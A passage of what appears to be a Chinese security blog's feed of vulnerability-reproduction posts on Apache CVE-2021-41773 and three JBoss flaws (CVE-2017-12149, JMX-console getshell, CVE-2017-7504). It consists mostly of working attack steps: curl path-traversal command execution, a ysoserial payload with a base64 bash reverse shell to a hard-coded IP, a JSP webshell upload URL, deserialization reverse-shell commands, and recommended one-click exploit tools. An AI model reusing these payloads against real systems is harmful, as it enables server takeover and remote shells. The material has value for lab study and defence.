HTTP&#x2F;1.1Host: 106.55.147.147:8080User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko&#x2F;20100101 Firefox&#x2F;91.0Accept: *&#x2F;*Accept-Language: zh-CN,en;q&#x3D;0.5Accept-Encoding: gzip, deflateConnection: closePragma: no-cacheCache-Control: no-cache<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/2871523259279.png"></p><p>在服务端开启了cgi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意命令：<br><code>curl -v --data &quot;echo;id&quot; &#39;http://your-ip:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#39;</code><br><code>curl -v --data &quot;echo;id&quot; -x 127.0.0.1:8080 &#39;http://106.55.147.147:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#39;</code><br>-x 代表代理</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;cgi-bin&#x2F;.%2e&#x2F;.%2e&#x2F;.%2e&#x2F;.%2e&#x2F;bin&#x2F;sh HTTP&#x2F;1.1Host: Your ip:8080User-Agent: curl&#x2F;7.64.1Accept: *&#x2F;*Content-Length: 7Content-Type: application&#x2F;x-www-form-urlencodedConnection: closeecho;id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/198315816802.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Apache-HTTP-Server-2-4-49-路径穿越漏洞-CVE-2021-41773&quot;&gt;&lt;a href=&quot;#Apache-HTTP-Server-2-4-49-路径穿越漏洞-CVE-2021-41773&quot; class=&quot;headerlink&quot; title</summary>
      
    
    
    
    <category term="漏洞复现" scheme="http://ta0ing.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Apache HTTPD" scheme="http://ta0ing.github.io/tags/Apache-HTTPD/"/>
    
    <category term="CVE-2021-41773" scheme="http://ta0ing.github.io/tags/CVE-2021-41773/"/>
    
  </entry>
  
  <entry>
    <title>JBOSS CVE-2017-12149</title>
    <link href="http://ta0ing.github.io/article/c3936183.html"/>
    <id>http://ta0ing.github.io/article/c3936183.html</id>
    <published>2021-07-05T03:41:48.000Z</published>
    <updated>2021-10-09T16:11:34.390Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="JBOSS-CVE-2017-12149复现"><a href="#JBOSS-CVE-2017-12149复现" class="headerlink" title="JBOSS CVE-2017-12149复现"></a>JBOSS CVE-2017-12149复现</h2><h3 id="一、影响范围"><a href="#一、影响范围" class="headerlink" title="一、影响范围"></a>一、影响范围</h3><p>漏洞影响5.x和6.x版本的JBOSS AS。</p><h3 id="二、漏洞原理"><a href="#二、漏洞原理" class="headerlink" title="二、漏洞原理"></a>二、漏洞原理</h3><p>JBOSS Application Server是一个基于J2EE的开放源代码的应用服务器。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用，2006年，JBoss被Redhat公司收购。</p><p>2017年8月30日，厂商Redhat发布了一个JBOSSAS 5.x 的反序列化远程代码执行漏洞通告。该漏洞位于JBoss的HttpInvoker组件中的 ReadOnlyAccessFilter 过滤器中，其doFilter方法在没有进行任何安全检查和限制的情况下尝试将来自客户端的序列化数据流进行反序列化，导致攻击者可以通过精心设计的序列化数据来执行任意代码。但近期有安全研究者发现JBOSSAS 6.x也受该漏洞影响，攻击者利用该漏洞无需用户验证在系统上执行任意命令，获得服务器的控制权。</p><h3 id="三、攻击过程"><a href="#三、攻击过程" class="headerlink" title="三、攻击过程"></a>三、攻击过程</h3><p>访问漏洞环境<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606543_20200907102825405_8279.png"><br>访问访问<a href="http://8.210.152.234:8080//invoker/readonly">http://8.210.152.234:8080//invoker/readonly</a> 页面返回500错误 ,基本可以判断存在此漏洞<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606543_20200907102314863_29332.png"></p><h4 id="1-开启nc监听"><a href="#1-开启nc监听" class="headerlink" title="1.开启nc监听"></a>1.开启nc监听</h4><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606543_20200907102937678_15577.png"></p><h4 id="2-生成反弹shell命令"><a href="#2-生成反弹shell命令" class="headerlink" title="2.生成反弹shell命令"></a>2.生成反弹shell命令</h4><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606543_20200907103148639_996.png"></p><h4 id="3-反弹shell命令转换以后得到密令如下"><a href="#3-反弹shell命令转换以后得到密令如下" class="headerlink" title="3.反弹shell命令转换以后得到密令如下"></a>3.反弹shell命令转换以后得到密令如下</h4><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606543_20200907103459983_28482.png"></p><h4 id="4-序列化数据生成"><a href="#4-序列化数据生成" class="headerlink" title="4.序列化数据生成"></a>4.序列化数据生成</h4><p>使用ysoserial生成序列化数据，由于Vulhub使用的Java版本较新，所以选择使用的gadget是CommonsCollections5,如果不成功可以换成CommonsCollections6。1-10 都可以</p><pre class="line-numbers language-none"><code class="language-none">java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjIxMC4yMzUuMjQ5Lzk5OTkgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt;bb.ser<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606544_20200907104817445_3967.png"><br>将文件发送到服务器中(建议使用curl,曾经尝试使用burp发送 未成功)<br>命令如下<br><code>curl http://8.210.169.237:8080//invoker/readonly --data-binary @cs.ser</code><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606544_20200907104950059_18821.png"></p><h4 id="5-发送完成shell到手"><a href="#5-发送完成shell到手" class="headerlink" title="5.发送完成shell到手"></a>5.发送完成shell到手</h4><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606544_20200907105040493_6371.png"></p><h3 id="三、一键利用工具推荐"><a href="#三、一键利用工具推荐" class="headerlink" title="三、一键利用工具推荐"></a>三、一键利用工具推荐</h3><p><code>https://github.com/yunxu1/jboss-_CVE-2017-12149</code><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606544_20200907105427737_25318.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;JBOSS-CVE-2017-12149复现&quot;&gt;&lt;a href=&quot;#JBOSS-CVE-2017-12149复现&quot; class=&quot;headerlink&quot; title=&quot;JBOSS CVE-2017-12149复现&quot;&gt;&lt;/a&gt;JBOSS C</summary>
      
    
    
    
    <category term="漏洞复现" scheme="http://ta0ing.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="JBOSS" scheme="http://ta0ing.github.io/tags/JBOSS/"/>
    
    <category term="CVE-2017-12149" scheme="http://ta0ing.github.io/tags/CVE-2017-12149/"/>
    
  </entry>
  
  <entry>
    <title>Jboss JMX Console未授权访问Getshell</title>
    <link href="http://ta0ing.github.io/article/be1e1f83.html"/>
    <id>http://ta0ing.github.io/article/be1e1f83.html</id>
    <published>2021-07-05T03:41:48.000Z</published>
    <updated>2021-10-09T16:11:34.391Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="Jboss-JMX-Console未授权访问Getshell"><a href="#Jboss-JMX-Console未授权访问Getshell" class="headerlink" title="Jboss JMX Console未授权访问Getshell"></a>Jboss JMX Console未授权访问Getshell</h2><h3 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>由于JBoss中/jmx-console/HtmlAdaptor路径对外开放，并且没有任何身份验证机制，导致攻击者可以进⼊到jmx控制台，并在其中执⾏任何功能</p><h3 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a>影响版本：</h3><p>Jboss4.x以下版本。</p><h3 id="利用方式："><a href="#利用方式：" class="headerlink" title="利用方式："></a>利用方式：</h3><blockquote><p>Jboxx4.x /jmx-console/ 后台存在未授权访问，进入后台后，可直接部署 war 包Getshell。若需登录，可以尝试爆破弱口令登录（类似于tomcat的War包配置漏洞）</p></blockquote><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建:"></a>环境搭建:</h3><h4 id="0x01-使用docker搭建漏洞环境"><a href="#0x01-使用docker搭建漏洞环境" class="headerlink" title="0x01:使用docker搭建漏洞环境"></a>0x01:使用docker搭建漏洞环境</h4><blockquote><p>一键安装Docker<br>这是推荐方式。在未安装过Docker的机器上，root权限执行如下命令即可一键安装最新版Docker：<br>curl -s <a href="https://get.docker.com/">https://get.docker.com/</a> | sh </p></blockquote><p>1、搜索漏洞环境：</p><pre class="line-numbers language-none"><code class="language-none">sudo docker search testjboss<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/5759958140263.png"><br>2、拉取镜像：</p><pre class="line-numbers language-none"><code class="language-none">sudo docker pull testjboss&#x2F;jboss<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/3844100168689.png"><br>3、查看现有的docker环境</p><pre class="line-numbers language-none"><code class="language-none">sudo docker images<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/1123202156556.png"><br>4、运行环境，访问<a href="http://ip即可/">http://ip即可</a></p><pre class="line-numbers language-none"><code class="language-none">sudo docker run -p 80:8080 -d testjboss&#x2F;jboss<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现:"></a>漏洞复现:</h3><h4 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1:"></a>Method 1:</h4><p><a href="http://your/">http://Your</a> IP/jmx-console  直接访问jboss控制台</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;Your IP&#x2F;jmx-console&#x2F;&#x2F;HtmlAdaptor?action&#x3D;invokeOpByName&amp;name&#x3D;jboss.admin%3Aservice%3DDeploymentFileRepository&amp;methodName&#x3D;store&amp;argType&#x3D;java.lang.String&amp;arg0&#x3D;August.war&amp;argType&#x3D;java.lang.String&amp;&amp;arg1&#x3D;shell&amp;argType&#x3D;java.lang.String&amp;arg2&#x3D;.jsp&amp;argType&#x3D;java.lang.String&amp;arg3&#x3D;%3c%25+if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b+%25%3e&amp;argType&#x3D;boolean&amp;arg4&#x3D;True<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>url中的参数：arg0代表war包的名称，arg1=文件名称，arg2=文件后缀名，arg3=文件内容<br>url解码为：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;Your IP&#x2F;jmx-console&#x2F;&#x2F;HtmlAdaptor?action&#x3D;invokeOpByName&amp;name&#x3D;jboss.admin:service&#x3D;DeploymentFileRepository&amp;methodName&#x3D;store&amp;argType&#x3D;java.lang.String&amp;arg0&#x3D;August.war&amp;argType&#x3D;java.lang.String&amp;&amp;arg1&#x3D;shell&amp;argType&#x3D;java.lang.String&amp;arg2&#x3D;.jsp&amp;argType&#x3D;java.lang.String&amp;arg3&#x3D;&lt;%+if(request.getParameter(&quot;f&quot;)!&#x3D;null)(new+java.io.FileOutputStream(application.getRealPath(&quot;&#x2F;&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());+%&gt;&amp;argType&#x3D;boolean&amp;arg4&#x3D;True<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>功能是写入文件，f=文件名，t=文件内容</strong></p><p>写入hack.txt文件</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;Your IP&#x2F;August&#x2F;shell.jsp?f&#x3D;hack.txt&amp;t&#x3D;Are you script boy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/5198123176722.png"><br>访问hack.txt文件<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/758824169391.png"></p><hr><h4 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2:"></a>Method 2:</h4><p>首先制作一个war木马（需要jdk），在jsp小马目录下cmd执行：</p><pre class="line-numbers language-none"><code class="language-none">jar cvf shell.war test.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/3179648165946.png"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/911249179580.png"><br>若报拒绝访问错误，请使用管理员权限运行cmd<br><strong>将war包放在自己的WEB服务器上</strong></p><pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 777    #使用python起临时web服务 端口为777<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/4961950174686.png"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/4532151155927.png" alt="\\"></p><hr><p>Jboxx4.x /jmx-console/ 后台存在未授权访问，进入后台后，可直接部署 war 包Getshell。若需登录，可以尝试爆破弱口令登录。<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/1174650177184.png"><br>然后找到jboss.deployment（jboss 自带的部署功能）中的flavor=URL,type=DeploymentScanner点进去（通过 url 的方式远程部署）<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/1104253178367.png"><br> 也可以直接输入URL进入：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;Your IP&#x2F;jmx-console&#x2F;HtmlAdaptor?action&#x3D;inspectMBean&amp;name&#x3D;jboss.deployment:type&#x3D;DeploymentScanner,flavor&#x3D;URL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="vx_images/4759354173503.png"><br>找到页面中的void addURL()选项来远程加载war包来部署。<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/5814456160183.png"><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/3690404160713.png"><br>查看部署是否成功<br>返回到刚进入jmx-console的页面，找到 jboss.web.deployment，如下说明部署成功。如果没显示，多刷新几次页面或者等会儿，直到看到有部署的war包即可</p><h3 id="检测工具"><a href="#检测工具" class="headerlink" title="检测工具:"></a>检测工具:</h3><p>检测工具：jexboss，一个使用Python编写的Jboss漏洞检测利用工具，通过它可以检测并利用web-console，jmx-console，JMXInvokerServlet这三个漏洞，并且可以获得一个shell。<br>使用：</p><pre class="line-numbers language-none"><code class="language-none">python jexboss.py -u http:&#x2F;&#x2F;ip:port<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/img/2538330172164.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;Jboss-JMX-Console未授权访问Getshell&quot;&gt;&lt;a href=&quot;#Jboss-JMX-Console未授权访问Getshell&quot; class=&quot;headerlink&quot; title=&quot;Jboss JMX Console未授</summary>
      
    
    
    
    <category term="漏洞复现" scheme="http://ta0ing.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="JBOSS" scheme="http://ta0ing.github.io/tags/JBOSS/"/>
    
    <category term="JBOSS未授权访问Getshell" scheme="http://ta0ing.github.io/tags/JBOSS%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AEGetshell/"/>
    
  </entry>
  
  <entry>
    <title>Jboss CVE-2017-7504</title>
    <link href="http://ta0ing.github.io/article/45a5e5d3.html"/>
    <id>http://ta0ing.github.io/article/45a5e5d3.html</id>
    <published>2021-07-05T03:41:48.000Z</published>
    <updated>2021-10-09T16:11:34.385Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="JBOSSMQ-JMS-CVE-2017-7504-集群反序列化漏洞-4-X"><a href="#JBOSSMQ-JMS-CVE-2017-7504-集群反序列化漏洞-4-X" class="headerlink" title="JBOSSMQ JMS CVE-2017-7504 集群反序列化漏洞 4.X"></a>JBOSSMQ JMS CVE-2017-7504 集群反序列化漏洞 4.X</h2><h3 id="0x01漏洞描述"><a href="#0x01漏洞描述" class="headerlink" title="0x01漏洞描述"></a>0x01漏洞描述</h3><p>JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java⽂件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利⽤该漏洞执⾏任意代码。</p><h3 id="0x02影响版本"><a href="#0x02影响版本" class="headerlink" title="0x02影响版本"></a>0x02影响版本</h3><p>JBoss AS 4.x及之前版本</p><h3 id="0x03漏洞利用"><a href="#0x03漏洞利用" class="headerlink" title="0x03漏洞利用"></a>0x03漏洞利用</h3><hr><p>1、首先验证目标jboss是否存在此漏洞,直接访问<br>/jbossmq-httpil/HTTPServerILServlet 路径下。若访问200或下载，则可能存在漏洞。<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606636_20201208220941482_14194.png"><br>此处我们使用<a href="https://github.com/joaomatosf/JavaDeserH2HC">JavaDeserH2HC</a>工具来利用该漏洞,尝试直接弹回一个shell<br>注意：这个工具在linux系统使用</p><pre class="line-numbers language-none"><code class="language-none">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.javajava -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 反弹的IP:端口curl http:&#x2F;&#x2F;目标IP:8080&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet&#x2F; --data-binary @ReverseShellCommonsCollectionsHashMap.ser<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>端口监听：</strong><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606636_20201208221156161_24717.png"><br>反弹shell成功<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606636_20201208221425595_28775.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;JBOSSMQ-JMS-CVE-2017-7504-集群反序列化漏洞-4-X&quot;&gt;&lt;a href=&quot;#JBOSSMQ-JMS-CVE-2017-7504-集群反序列化漏洞-4-X&quot; class=&quot;headerlink&quot; title=&quot;JBO</summary>
      
    
    
    
    <category term="漏洞复现" scheme="http://ta0ing.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="JBOSS" scheme="http://ta0ing.github.io/tags/JBOSS/"/>
    
    <category term="CVE-2017-7504" scheme="http://ta0ing.github.io/tags/CVE-2017-7504/"/>
    
  </entry>
  
</feed>
